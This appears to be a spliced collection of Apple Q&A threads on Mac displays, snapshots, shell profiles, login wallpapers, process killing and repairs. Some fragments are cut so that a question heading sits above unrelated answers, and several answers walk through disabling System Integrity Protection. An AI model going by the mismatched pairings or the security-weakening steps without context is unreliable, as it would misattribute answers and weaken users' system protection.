the resolution of the monitor using DP is 2560 x 1440.\n\nA: The problem with your setup does not have to do with the resolution, as others have hypothesized. The problem is that the dock you're using is not supported on macOS for a 3-display configuration.\nIn practice, the HP Thunderbolt docks require MST-support for multiple displays from the system before they can enable 3 separate displays connected to the dock. MST is not supported on macOS for this purpose(in contrast to Windows), as thus it simply won't work.\nYou can connect two of the displays to the dock (as you have already figured out). The third display you'll need to connect directly to the MacBook Pro in order to get it as a separate display.\n\nA: As shown on Apple's website, there is a restriction on the number of monitors that can be used at the same time. If you want a more specific answer, could you post the resolutions of your monitors.\n\n\n*\n\n*Up to two displays with 5120-by-2880 resolution at 60Hz at over a billion colors.\n\n*Up to four displays with 4096-by-2304 resolution at 60Hz at millions of colors.\n\n*Up to four displays with 3840-by-2160 resolution at 60Hz at over a billion colors.\n\n\nAdditionally, it is possible (yet very unlikely) that your MacBook could not supply enough power to send all those bytes to your monitors (especially if you have other peripherals plugged in to your MacBook)\n", "Q: Unidirectional sync from iOS device to iCloud Photo Library I have an older iPhone with limited storage. I use it as a \"distraction free\" version of my main phone for the gym. I've deleted almost all apps except for Music and Podcasts.\nI want to be able to take photos with this iPhone's camera, and I want them to be backed up and uploaded to my other devices / iCloud Photo Library.\nI do not need to view other devices' photos on this device.\nI believe this may be a somewhat common intended workflow for people with multiple iOS devices.

I assume that either my main iPhone or Mac grabs the photos and adds them.\nIf the devices did not sync for > 30 days, those photos probably would not be synced to iCloud. But that's not a huge limitation.\nThe only major annoyance is that Photo Stream does not sync Live Photos.

(so there are data residues left)\nSnapshot dates for all disks:\n2019-08-28-082639\n2019-08-29-113651\n2019-08-29-135729\n2019-08-29-145723\n2019-08-29-155709\n2019-08-29-181243\n\n\nSolution:\nIt is necessary to manually delete them all:\ntmutil deletelocalsnapshots <snapshot>\nOne by one:\ntmutil deletelocalsnapshots 2019-08-28-082639\ntmutil deletelocalsnapshots 2019-08-29-113651\ntmutil deletelocalsnapshots 2019-08-29-135729\ntmutil deletelocalsnapshots 2019-08-29-145723\ntmutil deletelocalsnapshots 2019-08-29-155709\ntmutil deletelocalsnapshots 2019-08-29-181243\n\n\nAfter doing, check again:\ntmutil listlocalsnapshotdates\nSnapshot dates for all disks:\n\n\nThere is no listing result as output. So now you have freed all possible space!\nThe OP got 152GB of free space by manually deleting all localsnapshots, which was not recovered by the thinning process.\nThis is very, very common on MacOS Catalina, I can assure it, and Apple is aware of it and changing things during the Beta phase. But it can also happen on Mojave and/or other versions.\n", "Q: Iterm2 BrokenPipe Failed to exec /usr/bin:/bin:/usr/sbin:/sbin: No such file or directory PATH=/usr/bin:/bin:/usr/sbin:/sbin Backstory: I've been given a lender computer from the school I'm attending and I was attempting to npm install global packages for my react-native project. I was able to install the packages, but my programs didn't appear to know how to actually access those globally installed packages. That's my theory at least. So I started going down the google rabbit hole ... \nThe first error I was getting was: \nexpo command not found (expo being Expo CLI, the react-native related package I had install globally numerous times by now), so I went to the provided site and entered the suggested command: echo $PATH in terminal.\nAfter running Echo $Path the above author said:\ncheck if `/users/me/.npm-global/bin` is in your path.\n\nThe response from my machine was: /usr/bin:/bin:/usr/sbin:/sbin:\nThe author than proceeded to say:\nIf it isn’t there, you will need to add it to the path. \nOpen up ~/.bash_profile then add the following line to the bottom:\n\nWell, it appeared that I didn't have a ~/.bash_profile, I assume it said no such directory found or something to akin to that. I can't simulate this error anymore because well ... my terminal at this time immediately crashes on startup.\nSo, I visited this stackExchange question which asked \"How to create ~/.bash_profile and ~/.profile\". I followed the steps from the top solution which by all accounts, seemed to successfully create the file.\nWith the file now seemingly made, I returned back to the original linked site and entered ~/.bash_profile which opened the file and \"add[ed] the following line to the bottom:\"\n# NPM global installs\nexport PATH=$PATH:~/.npm-global/bin\n\nFollow that I returned to the shell and entered: source ~/.bash_profile.\nI don't have access (currently) to the error I was getting when I entered that command in the shell, but I believe the error was something related to the directory wasnt found. \nAnyway, I changed something ... I think(?) I added the line source ~/.bash_profile to the nano terminal window where I earlier entered the above command ... but at this point I can even get back there to confirm that was the case. \nSo that's where I am now, I still can't access the globally installed files or at this point even open my terminal without it instantly closing. \nOn last thing, i entered usr/bin:/bin:/usr/sbin:/sbin in the iterm2 > preferences > profiles > general > command destination. That's exactly where I am now and why my iterm broken pipe error says what it says.\n\nA: Question asker here ... \nI had the fortunate luck of working through this in a screen share with a graduate from the school and the solution we found regarding my issue is that I had this in my .bash_profile file:\nsource ~/.bash_profile\nexport PATH=$PATH:~/.npm-global/bin\n\nSo, the immediate issue was the source ~/.bash_profile, this was causing the piping error and crashing all my terminals.\nQ: How did we access this file if terminal was broken? \nA: I went into vscode (any text editor will probably work just the same) and opened the files path. So, vscode > file > open > X's MacBook Pro > untitled > Users > X > clicked open. This opened all the files (including the hidden one we want access to) and opened the file named .bash-profile.\nIn the .bash-profile file I updated it from what was posted above to whats posted below and saved it. \nexport PATH=$PATH:\"~/.npm-global/bin\"\n\n", "Q: How to move Photos Library and associated iPhotos Library to another drive without breaking links? I wish to move my Photos Library to a secondary drive, both formatted with APFS. I still have the iPhotos Library from where the pictures were imported. \nI'm concerned that when moving the Photos and the iPhotos libraries to a new drive the shared masters will be duplicated and increase storage usage.\nIs there a way I can move both libraries and preserve the link between them?\n\nA: So, no definitive answer.\nI had copied my iPhotos, Aperture and Photos libraries to the new drive using Finder, but I was worried I was using unnecessary space. I did a new copy using rsync as follows:\nrsync -azH --progress Aperture\\ Library.migratedaplibrary iPhoto\\ Library.migratedphotolibrary Photos\\ Library\\ \\(Aperture\\).photoslibrary Photos\\ Library\\ \\(iPhoto\\).photoslibrary /Volumes/Secondary\\ SSHD/Users/me/Pictures\n\nNow I'm sure I'm using too much space. :-)\nThis command should preserve hard links from the source in the destination, but as @Tetsujin commented on the question APFS doesn't support hard links and I don't think it would use copy on write with files in different media (what would happen if I ejected the media?).\n", "Q: Is there any way to force the Mac to not to log me out after ten minutes?

Note: This question is about the background image for the login screen (what you see before you log in), not the desktop wallpaper, which can still be changed by going to: System Preferences » Desktop & Screen Saver » Desktop.\nIn previous versions of macOS, I believe it was possible to change the background image of the login screen by replacing the default in /Library/Desktop Pictures/.\nHowever, it appears that the default background image for Catalina’s login screen is /System/Library/Desktop Pictures/Catalina.heic\nSince /System/Library/Desktop Pictures/ is part of the read-only system partition, there appears to be no way to change the image which appears as the background before you log in.\nIf anyone knows of a way around that, please let us know.\nTested version “Catalina Public Beta 7”:\nProductName:    Mac OS X\nProductVersion: 10.15\nBuildVersion:   19A546d\n\nUpdate 2019-10-05:\nUnfortunately there's no permalink for this (it's currently at https://www.koingosw.com/products/macpilot/ under \"Version History\" but that will change as soon as the next version is released) but the MacPilot folks also agree that there is no way to do this in Catalina:\n\nThe current version of Catalina is the \"GM\" before the official release.\nNote:\nPersonally I don’t consider “Disable SIP” to be a viable solution for something as trivial as a background image.\nHowever, it appears that there is no other way to do this than to, at least temporarily, disable SIP.\n\nA: I have been successful in changing the Catalina login wallpaper and have (easy) instructions below that I think will help. I compiled these instructions from several others, so I deserve no credit for this.\nFind the wallpaper/picture you want to use as the new login wallpaper, copy it to an easy to find location (like the desktop), and rename it Catalina.heic\n\n\n*\n\n*Boot into recovery mode by holding down Command R when booting the computer (hold down Command R until you see the Apple logo)\n\n*When in recovery mode, click on the top drop down menu \"Utilities\" and launch Terminal\n\n*In terminal, type the following command and press Return:\ncsrutil disable\n\nThis turns off System Integrity Protection\n\n*Restart your Mac\n\n*Launch Terminal and enter the following command:\nsudo mount -t apfs -wu /dev/disk1s5 /Volumes\n\nReplace disk1s5 with the identifier for your system partition (you can find this in Disk Utility by clicking Info with the partition selected, then looking next to BSD device node). You’ll need to enter your password.\n\n*In Terminal, enter the following command:\nsudo mount -wu /; killall Finder\n\n\n*Using the Finder, navigate to Macintosh HD > System > Library->Desktop Pictures and right click (Command Click) to rename Catalina.heic to Catalina.orig.heic (be careful and make sure you pick the correct one, there are a lot of “Catalina” pictures/files).\n\n*Copy (drag) Catalina.heic from your desktop into Macintosh HD > System > Library->Desktop Pictures\n\n*To get the Login to use it, we update the preboot in Terminal, enter the following command:\ndiskutil apfs updatePreboot /\n\n\n*Reboot – you should now see the new login wallpaper. \n\n*The system folders will be back to the copy protected state but \nSIP wont be turned back on by default when you reboot. To turn that back on, follow step 1. and 2. Than in terminal, type the following command and press Return:\ncsrutil enable\n\n\n*Reboot. \n\n*To check if it is enabled go to Apple Logo > About This Mac > System Report > Software. Here you should see the entry: System Integrity Protection:    Enabled\n\nA: It is possible! \nTo add to user3439894’s excellent instructions above: with FileVault enabled in 10.15, I had to also run diskutil apfs updatePreboot / to get the changes to “stick” on the FileVault (EFI) faux-login screen.\nThis writes a bunch of /System/Library/Caches/com.apple.corestorage/EFILoginLocalizations/*.efires files, which seem to be the login preferences—like for example, the lock message text. These would not update for me, despite other folks suggesting editing/toggling them in the System Preferences UI. updatePreboot made them change on the next restart.\nThis worked for the background image and the lock message text. However the FileVault/EFI login still ignores the “Display login window as: Name and password” option, unfortunately. Baby steps.\n\nA: To change Catalina login screen, please bear in mind the following:\n\n*\n\n*The intro login screen (when you login after a restart)\n\n*The log out screen (When you select Log Out)\n\n*The lock screen (When you select Lock Screen)\n\nI know, this may sound confusing (bear with me for a second).\nIn theory, everything is simple. All you need to do is replace the proper image in the appropriate location and you are done.\nStep one (i.e. the intro login screen) is kind of difficult because it requires you to jump through extra hoops because of a feature known as SIP aka System Integrity protection, which will make it hard for you to change system files even if you are an administrator\nLet's start with Step 3 working our way to Step 1.\nStep 3 (Changing the lock screen)\nChanging the lock screen is a breeze. All you have to do is change your desktop background image and voila.\nTo verify this do:\nCtrl + Command + Q\n\nStep 2 (Changing the logout screen)\nType the following to launch Spotlight:\nCommand + Space\n\nThen type of the following to navigate the log out folder mac will be looking for the log out image:\n/System/Caches/\n\nNote: If Spotlight does not open the folder, do it using Finder (Shift + Command + G).\nFrom this folder, you may or may not have another sub folder named Desktop Pictures. If you do not have it, create a folder with that name in there.\nInside the Desktop Pictures folder, you need to have another sub-folder associated with your account which goes by the name of your UUID (universally unique identifier). To know this information (i.e your UUID) do the following:\n\nSystem Preferences > Users & Group > On the Left Hand Pane Right Click\non Your current user > Choose Advanced in the pop-up menu > Copy Your\nUUID from there\n\nCreate a sub-folder inside the Desktop Pictures and rename it exactly the same as your UUID (be sure to leave to trailing or leading spaces)\nFrom there, you only need to paste an image inside that folder named lockscreen.png\nTo verify this, logout and you should see the picture you previously had chosen. Sometimes, you may need to go to Preference > Login Items > Select Something. This re-initiates the caching mechanism.\nStep 3 (Changing the intro login screen i.e. when you login after a restart)\nIn theory, all you need to do is something similar to step 2 without the UUID part.\nUsing Spotlight (or Finder Shift + Command + G) navigate to that folder by doing the following:\n/System/Library/Desktop Pictures/\nNote the keyword System in front of that path. Meaning Mac OS doesn't know which account you are going to use.\nAll you need to do here is change the Catalina.heic image in that location to your own.\nThe problem is, SIP (System Integrity Protection) will not let you change anything, therefore you are stuck with a lonely rocky island pic.\nTo fix this, you are going to reboot into recovery mode (Steps can only be found using this article https://discussions.apple.com/thread/250713266). While restarting your computer, hold the following command until you get a recovery mode screen (You'll know when you are in recovery mode because the login screen differ from the standard one):\nCommand + R\n\nLaunch the Terminal application while in recovery mode\nUtilities > Terminal\n\nDisable SIP using the terminal\ncsrutil disable\n\nFrom there, you can simply copy and paste the image you wanted inside the System Desktop Pictures folder.\nIn Spotlight (or Finder Shift + Command + G), navigate to:\n/System/Library/Desktop Pictures/\n\nRename the Catalina.heic image to Catalina.heic.bak and copy and paste your new image renamed as Catalina.heic inside that same folder.\nAt this point, you are done. To confirm this, restart your computer. Bear in mind you will need to re-enable SIP. To do so, restart your computer and hold Control + R until you get to Recovery Mode and launch the terminal as you once did, and type:\ncsrutil enable\n\nThat's all folks. At this point, you controlled 100% any background image on your Mac OS X Catalina.\n\nA: Here's a simplified version of what you need to do (thanks to user3439894):\n\n\n*\n\n*Put an image you want to use as login background somewhere in your file system (I used my Downloads folder in this example).\n\n*Reboot your Mac holding Cmd+R to boot into Recovery OS.\n\n*Open Terminal from the Utilities menu on the menu bar.\n\n*Backup/Rename Catalina.heic to e.g. Catalina.original.heic in  /Volumes/Macintosh\\ HD/System/Library/Desktop\\ Pictures/, e.g.:\ncd  /Volumes/Macintosh\\ HD/System/Library/Desktop\\ Pictures\nmv Catalina.heic Catalina.original.heic\n\n\n*Copy your desired image: cp /Volumes/Macintosh\\ HD\\ -\\ Data/Users/[short_user_name]/Downloads/[image_from_step_1].jpg /Volumes/Macintosh\\ HD/System/Library/Desktop\\ Pictures/Catalina.heic\n\n\n*\n\n*Note you can replace the destination path in the above command with just ./Catalina.heic as you should already be in the target directory if you performed the previous step to backup the original file.\n\n\n*Reboot into normal mode.\n\n*Change any option in System Preferences > Users & Groups > Login Options to change the cached image.\n\n\nA: Reinstall macOS Catalina (this also works for Mojave too!)\nThe problem disappears when the setup of macOS has executed again.\nAfter the setup process everything is the same, but from now the selected wallpaper of the user account is visible in the login window before user logs in.\n\nA: You can find below the easiest way to change your lock-screen picture on MacOs Catalina:\n\n*\n\n*System Preferences > Security&Privacy > make sure FileVault is off.\n\n*System Preferences > User&Groups > Right Click on User after you unlocked settings > Advanced Options > Copy UUID\n\n*Go > Library/Caches > Make New Folder and rename to Desktop Pictures > Right click on the folder > Get info > Below where Sharing&Permissions is > make the admin read&write.\n\n*Open the new folder named Desktop Pictures > Make another folder and name paste the UUID as the folder's name > Get info on the new folder > make admin read&write as well.\n\n*Reboot mac.\n\n*Acces Library/Caches/ Desktop Pictures/ UUID folder > change picture with anything you want.\n\n*Reboot computer.\n\n\nA: Macintosh HD/Library/Caches/Desktop Pictures/<folder with a bunch of numbers and letters>/\nCopy and paste the image of your choosing into the folder with a bunch of numbers and letters. Then right click image > get info > click LOCKED.\nHope this helps!!!\n\nA: Alternative (unsafe) Solution\nFirst, it is required to disable csrutil from terminal in recovery mode.\nAfter restart, you have to mount your system partition with write-permissions with\nsudo mount -t apfs -wu /dev/disk1s5 /Volumes\n\nand\nsudo mount -wu /; killall Finder \n\nnow... go to your Desktop and open your Terminal.\n\n*\n\n*Navigate to your Desktop:\n\ncd ~/Desktop\n\n\n*\n\n*Create a new File:\n\ntouch update_my_login_wallpaper.sh\n\n\n\n*Open the File with:\n\nnano update_my_login_wallpaper.sh\n\n\n\n*Add the following code:\n\n#!/usr/bin/env bash\n\ncwp=$(osascript -e 'tell app \"finder\" to get posix path of (get desktop picture as alias)')\necho \"Updating DefaultDesktop.heic symlink to:\" $cwp\nln -sf \"$cwp\" /System/Library/CoreServices/DefaultDesktop.heic\n\n\n\n\n*Hit CTRL + X then Y and ENTER to safe and exit.\n\n\n*Add the execution flag to the script with:\nchmod +x update_my_login_wallpaper.sh\n\nFinally, you can now call this script if wish to update your login wallpaper with:\nsudo sh ~/Desktop/update_my_login_wallpaper.sh\n\nNote:\nWithout any warranty! I recommend to save the symlink under /System/Library/CoreService before.\nOnly works for default wallpapers in /Library/Desktop Pictures\n\nA: You can run this command: \"mount -uw /\"\nThis allows to get out of 'readonly' file system error until the next time you reboot (it turns back into read-only)\n\nA: How To Change The Lock Screen\n1)              Select or create an image and name it: Catalina.heic\n2)              Go to: Finder > Applications > Utilities > Disk Utility\na)      Select Macintosh HD\nb)      Click on Info\nc)      Read BSD device node (mine says disk1s1)\n3)          Shutdown computer\n4)          Restart computer – holding down the [command] + [R] keys until it boots\n5)          Select admin account and enter in the password\n6)          Click on utilities and open Terminal\n7)          Enter: csrutil disable and press return – you have now disabled the integrity\n8)          Restart computer\n9)          Go to: Finder > Applications > Utilities > Terminal\n10)     Enter: sudo mount -t apfs -wu /dev/[system ID]/Volumes\n11)     Enter: sudo mount -wu /; killall Finder\n12)     Go to: Finder > Go > Go to Folder \n13)     Enter: /System/Library/Desktop Pictures\n14)     Select image: Catalina.heic and rename it: old.Catalina.heic\n15)     Drag=and-drop the image you named: Catalina.heic into the open folder\n16)     Go to: Finder > Applications > Utilities > Terminal\n17)     Enter: diskutil apfs updatePreboot /[system ID] and wait for it to finish\n18)     Close all open windows\n19)     Shutdown computer\n20)     Restart computer – holding down the [command] + [R] keys until it boots\n21)     Select admin account and enter in the password\n22)     Click on utilities and open Terminal\n23)     Enter: csrutil enable and press return – you have now enabled the integrity\n24)     Restart computer\n\nA: Install Onyx, there's this option!

I want to kill the process of the Automator application, but i can't find the name of it in the activity monitor.\n\nA: The Automator.app's main process is called \"Automator\". \n\nYou should be able to Force Quit it from the Apple menu, or from right-clicking its Dock icon. \nOf course, Automator workflows that are still running will be entirely separate processes.\n\nA: I wrote an AppleScript a while back which helped me address the same kind of issue you are dealing with. In short, the code gives the options to choose from either visible or invisible application processes, in which you want killed.  The code then uses the shell script command kill to terminate those processes by their process ID.\nThe advantage to using this rather than Activity Monitor is that this code allows for selecting multiple items or processes to kill in one shot.  Activity Monitor only allows for selecting one process at a time.\nWith your circumstance, I would run this code and first choose to view the list of visible applications.  If Automator is not in that list, I would choose to kill Finder in that list (which will kill Finder and relaunch it). Then check to see if that solves your problem. If not, then run the script again and choose to view the list of invisible application processes, selecting \"WorkflowServiceRunner\" (if it exists), \"System Events\", and \"System UI Server\" and kill those processes (which should kill them and relaunch them also)\nYou can run this following code directly in Script Editor.app or save the code  in Script Editor.app as an application and just like any other app in Finder,  just double click the file to launch it.\nuse framework \"Foundation\"\nuse scripting additions\n\nproperty appsToKill : missing value\nproperty NSArray : a reference to current application's NSArray\n\nactivate\nset theChoice to button returned of (display dialog ¬\n    \"WOULD YOU LIKE TO LIST VISIBLE OR INVISIBLE APP PROCESSES?\" buttons ¬\n    {\"CANCEL\", \"VISIBLE\", \"INVISIBLE\"} default button ¬\n    \"INVISIBLE\" cancel button \"CANCEL\" with title ¬\n    \"  WOULD YOU LIKE TO LIST VISIBLE OR INVISIBLE APP PROCESSES?  \" with icon ¬\n    2 giving up after 10)\n\nif theChoice is \"INVISIBLE\" then\n    listInvisibleAppProcesses(false)\nelse if theChoice is \"VISIBLE\" then\n    listInvisibleAppProcesses(true)\nelse if theChoice is \"CANCEL\" then\n    return\nelse if theChoice is \"\" then\n    return\nend if\n\nset aList to ((NSArray's arrayWithArray:appsToKill)'s ¬\n    sortedArrayUsingSelector:\"caseInsensitiveCompare:\") as list\n\nactivate\nset killApp to (choose from list ¬\n    aList with title \"Choose The App To Kill\" with prompt ¬\n    \"Choose The App\" OK button name \"OK\" cancel button name ¬\n    \"CANCEL\" with multiple selections allowed)\n\nset pidList to {}\n\nif killApp is not false then\n    tell application \"System Events\"\n        repeat with i from 1 to count of killApp\n            set thisItem to item i of killApp\n            tell application process thisItem\n                set thePID to unix id\n                set end of pidList to thePID\n            end tell\n        end repeat\n    end tell\nelse\n    return\nend if\n\nset text item delimiters to space\ndo shell script ({\"kill\", pidList} as text)\n\non listInvisibleAppProcesses(trueOrFalse)\n    tell application \"System Events\"\n        set appsToKill to name of every application process ¬\n            where visible is trueOrFalse\n    end tell\nend listInvisibleAppProcesses\n\n\n\n\nHopefully this will help with your situation but if it doesn't, saving this code as an application in Script Editor.app  and using it rather than Activity Monitor...

When videochatting with WhatsApp (v2.19) on an iPhone (XR, iOS 12.4), the front camera is used because when you look at the screen you want the other person to be able to see your face. But using the back camera would allow you to show the other person your surroundings while viewing on the screen exactly what they are seeing, in other words using the screen as a viewfinder.\nHow can I switch between using the front and back cameras during such a videochat?\n\nA: There's a camera flip button in the bottom, beside the end call button.

It'll ask you to authenticate twice (once as an admin, to modify the System keychain, then as your user, to get access to the user keychain item).\n\n\nThere's probably a way to  trigger the automount at startup, rather than at first login, but it sounds like first login should be good enough for your needs.\n", "Q: Chrome browser ignoring parental controls I'm running MacOS 10.13.6 and it seems that the Chrome browser is ignoring the parental controls that I've set up for kids' accounts.  If I try to go to a particular website in Safari it blocks it.  However, that very same website is allowed in Chrome.  Is this expected behavior?  Is there something I can do to make Chrome follow the parental rules?\n\nA: This is the expected behavior, parental control only apply to the applications provided by Apple. At the time we needed that, we just blocked access to other applications through Parental Control. \n\nA: There are parental controls built into Chrome. The concept of parental controls in the Chrome browser, revolves around supervised user profiles. If a child is forced to browse the web while signed in under one of these restricted profiles, their parent or guardian has the final say regarding where they go and what they do while online. Not only does Chrome allow you to block specific websites, but it also creates a report of which sites they actually did visit during their browsing session. \nThe step-by-step instructions for setting this up is given here.\n\nA: I have to say that I have just removed chrome from my youngest boys laptop, as despite setting up parental controls on my router he can just bypass this.

Thank you so much!\n\nA: As stated, it's pretty difficult to do this. However, if you're willing to change the goal a little, and use a name ending in \".local\" instead of \".com\", it's trivial (in fact, it's already being done for you).\nLet me start with a little networking theory. I think you're mixing up two different levels: name resolution and routing.\nName resolution is how network names (like \"thisismylaptop.com\") into numeric IP addresses (like 127.0.0.1 or ::1). To simplify a bit, when you put in a name, your computer looks for it in /etc/hosts, and if it finds it it uses that number; if it doesn't find it, it asks a DNS (Domain Name Service) server to look it up for you.\nThis is a problem in your scenario, because your computer's /etc/hosts file applies only to that one computer; the other computer has its own /etc/hosts file, and it doesn't have your custom entries in it. You could run a DNS server, but then you'd need to find a way to configure all of the computers to use that DNS service, which is a whole other can of worms.\nRouting takes place after name resolution; it's the \"ok, I have a numeric address, now where do I actually send the packets (data) to get it there?\" phase. And there's another problem here, because 127.0.0.1 always refers to \"this computer right here\". That is, on your first computer, it sends packets to that first computer. On the second computer, it sends packets to the second computer. If you did manage to get all the computers to resolve \"thisismylaptop.com\" to 127.0.0.1, every computer would think that it was \"thisismylaptop.com\". Instead, you need to figure out what the IP address(es) attached to your computer's Wi-Fi interface is/are, and use that.\nThe good news is that wanting to do things like this is common, and so Apple worked out a solution long ago. Apple calls it Bonjour (the rest of the world calls it zeroconf), and it's been built into Mac OS X since 2002. The main limitation is that it requires names ending in \".local\" as a hint to the computers involved that they shouldn't use a regular DNS lookup, but instead use multicast DNS, which basically consists of yelling over the local network: \"Hey, is thisismylaptop.local out there? If so, send me your IP address(es), so we can talk.\"\nTo use it, go open System Preferences on your Mac, select the Sharing preference pane, and look near the top, just below the computer name. It'll probably say something like \"Computers on your local network can access your computer at: nywillbs-MacBook.local\". If you don't like that name, click Edit to change it (or change the computer name; by default it's based on that). If your other computer is running macOS, you can just use that name directly. If it's running Windows, install iTunes on it, and that'll install Bonjour as well. (There's supposed to be a way to install just Bonjour without iTunes, but I'm not sure it's up to date.)\n", "Q: How to copy an image from screenshot's markup?

I'm pretty sure they can see everything I type and changing my wifi security is pointless.  The android phone was infected with trojan.lezok.as and I have not yet been able to remove it and it just comes back after a hard reset.   I'm using a MacBook Pro Mid 2012 running Mojave 10.14.6. Malwarebytes scan shows clean on the laptop so I think the intrusion is network based and phone.\n\nA: The results of arp -a just show the other devices connected on your LAN's 192.168.1.x subnet.\n1 is likely to be your router and 255 the broadcast address. 13 is your Mac. There seem to be 7 other devices connected to it. You can always set a whitelist of devices in your router's web control panel.\n224.0.0.251 is a multicast mDNS address.\nThe results of ipconfig are, unsurprisingly, just configuration settings for your network interfaces. \nIf Malwarebytes finds nothing, then in the absence of any other evidence or data, I would be quietly confident that there was no infection. If your Android phone was infected, it is almost impossible that the same malware would work on a Mac.\nThe best thing you can do is check in System Prefs > Network that your DNS settings point to known, good servers. I recommend 1.1.1.1. \n", "Q: MacOS Mojave: Can not make changing background wallpaper Opening \"SystemPreferences\", then \"Desktop & Screen Saver\", and then the \"Desktop\" tab:\nI would like to add my own folder holding pictures to display as a background, and to change these pictures in certain intervals.\nI am able to add (with the \"+\" button) on the left the directory which holds by picture, but the checkboxes \"Change picture\" and \"Random order\" on the right are greyed out. How can I enable this?\n\n\nA: You need to select any one photo in the folder you made to be able to see the change picture button, checking which will enable random too. \nOther words, shift focus from side-bar of folders to photos. \nOnce you have moved to photos pane, enabled change, enabled random, background pictures will automatically be picked from the parent directory.\n\nA: Workaround for a similar use case: If you are trying to randomize from the Desktop Pictures folder you'll need to click the Apple folder at the top, which un-grey the option.\n", "Q: Apps flickering on homepage On my home screen, sometimes apps blink or flicker in a random order. Does anyone know what this means, or is it just some sort of glitch?\n\nA: This is an optimization task being performed by the iOS. The app icons flicker, i.e. the icon becomes grayed and the name of the app is replaced with the word Cleaning.... iOS is removing temporary files and cached app data.\n", "Q: Cubase not remembering window position when switching apps and coming back to it I know there's the ability to have \"saved states\" which is what Im' assuming Cubase (audio editing program) usually has, but for some reason I had an issue with Mojave recently, had to re-install the MacOS underlying, and now this program in particular is playing up.\nSo, I have 3 screens, I usually put one of these secondary windows on the 2nd screen, and normally if I switch to another app and come back to Cubase, everything's in it's place.  \nNow, every time I switch out and back, said window now reverts to the initial (1st) screen and doesn't remember its position.\nThere's no 'saved state' folder for the program, and I've reinstalled the software - is there any way of fixing this ? Or creating a saved state ? I don't have the programming knowledge.\n\nA: Check System Prefs > Mission Control & see what you have for 'Displays have separate Spaces'.\nMy guess is you have that enabled. \nCubase doesn't really use the Mac's Saved State because the state is really in the project file, or in your window sets, so I don't think it's the issue. I'm guessing it's because if each display is a different Space, you're moving one app to multiple Spaces… which isn't good. \nToggling that setting can really muck up your workflow & you have to re-allocate everything back to its correct Space, so I'm not going to do it just to test ;)\n", "Q: How to change the default login account on a NAS Share I have a Synology NAS which is connecting with the NAS admin account when I log into my Mac. I would like to change the account to a user account. I have tried to disconnect and reconnect with the user account but reverts tot he admin account when I restart my system. How can I change the default login account when connecting to a NAS share via SMB. \n\nA: Login mounts are stored as startup items, so you need to do the following:\n\n\n*\n\n*Open System Preferences \n\n*Select Users & Groups \n\n*click on the \"Login Items\" tab \n\n*find your NAS login in the list, select it and\ndelete it with the '-' button \n\n*If your NAS admin SW has a method for setting an automount, use that, and ignore the following\n\n*Mount your NAS volume\n\n*In the Finder select the mounted volume (or a folder on that volume)\n\n*Drag the volume icon into the Login Items list (in system preferences)\n\n*Log out & log back in to test\n\n", "Q: Can you use Apple Care+ without any checks (bringing just MacBook)? My MacBook Pro 15-inch 2017 is purchased in USA by a friend of mine.\nI think there is hardware issue because sometimes screen becomes black and I have to restart it.\nI have checked coverage by serial number at checkcoverage.apple.com and it says MacBook is covered by Apple Care Plus. \nI don't have any papers like a check but I have original box.\nI am going to USA soon. So my question is: Can I have a service from Apple by bringing them only MacBook without any papers?\n\n\nA: Yes, they confirm AppleCare status in their system, and you don’t need to provide anything else. \nAt least, that has been my experience.\n\nA: You can simply go the Apple Store and ask them to repair. You can say that it has Apple Care and they will verify it with your serial number. \nNo need to show any kind of paper. I have done 2 times already. \n", "Q: Problems using an iMac as an external monitor My iMac is not detecting my MacBook. Pressing Command and F2, but nothing happens. I am trying to use my iMac as an external display from my MacBook.\n\nA: Have you tried all the steps recommended by Apple?\n\nUse Target Display Mode\nFollow these steps to start using your iMac as a display:\n  \n  \n*\n  \n*Make sure that your iMac is turned on, and the other Mac is logged in to a macOS user account.\n  \n*Connect the Mini DisplayPort or Thunderbolt cable between the two computers.\n  \n*Press Command-F2 on the keyboard of the iMac that you want to use as a display.\n  \n  \n  After you press Command-F2, your iMac displays the desktop from the connected Mac.\nIf Command-F2 doesn't work\nIf your iMac doesn't switch to Target Display Mode when you press Command-F2, check these things:\n  \n  \n*\n  \n*Make sure that the iMac you're trying to use as a display supports Target Display Mode. \n  \n*Target Display Mode works only when your primary Mac is logged in to a macOS user account. For example, if your first Mac is at the FileVault login screen, pressing Command-F2 on your iMac does not enable Target Display Mode. You must first log in to your Mac (using a regular display, if necessary) before you can use an iMac in Target Display Mode.\n  \n*Make sure that you're pressing Command-F2 on the keyboard that's connected to the iMac you want to use as a display.\n  \n*In Keyboard System Preferences, if the checkbox is enabled for \"Use all F1, F2, etc. keys as standard function keys,\" the key combination changes to Command-Fn-F2.\n  \n*Make sure that your Mini DisplayPort or Thunderbolt cable is connected to both computers.\n  \n*If you're currently logged in on the iMac you want to use as a display, try logging out to return to the login window. Then press Command-F2 again.\n  \n*Some older Apple keyboards and third-party keyboards might not allow Command-F2 to toggle display modes. If this happens, use the keyboard that came with your iMac to toggle Target Display Mode on and off. \n  \n*If your iMac is currently started up in Windows, it won't enter Target Display Mode. Target Display Mode isn't supported in Boot Camp.\n  \n\n", "Q: Can a minor attend a Genius Bar appointment alone? Can someone under 18 attend a Genius Bar appointment alone, if the device is in their name and they know the Apple ID details?\n\nA: No, you need to be over 18.

Purchase under these terms is available only to those who have reached the age of majority.\n\n(Source)\nAlso confirmed by a recent live chat.\n", "Q: iTunes App on macOS - play song now I recently switched from Spotify to Apple Music. I cannot find any Play button next to the song's name in the app (as compared to Spotify). I cannot find the option to play the song now in place of the currently playing song - which is weird and annoying. A workaround for this is that I right-click on the name of the song, set it to Play Next and then use the >> button to move to the next song. Is this the only possible way or am I missing something?\nOS version: 10.14.6 and app is up-to-date.\nScreenshot of iTunes library page:\n\n\nA: Try a double tap on the song name. \n", "Q: How to minimise the risk of using a MacBook Pro 2015 recalled due to battery faults My MacBook 2015 pro Retina 15'' has to be recalled by Apple. The reason is that its battery may be a fire hazard; eg macromors. Apple said the repairs can take two-three weeks. Because of my work, I absolutely can't have this interruption during the next month. (I will get the MBP fixed in a month's time.)\nQuestion: If I must use my MBP, how can I minimise the battery risks? \nI plan to do these:\n\n\n*\n\n*Shut down and unplug when not using\n\n*Have a CO2 fire extinguisher nearby\n\n*Only use the MBP plugged in to the mains, and not from the battery\n\n*Constantly monitor the fan speeds and the battery/CPU temperatures and shut down when they spike\n\n\nWould these work?  Or should I do something else instead or in addition?\n\nA: Minimizing the risk is simple. Don’t charge the battery.\nDoes’t matter if you are sleeping or shut down, the discharge doesn’t trigger a problem. The charging does. So just don’t use the Mac once it needs a charge.\nIn case you're worried about the time to fix - here is a crowd-sourced list of times to repair:\nBattery Recall Turnaround by Apple*:\nFrom            | to Depot     | Turnaround  | Notes 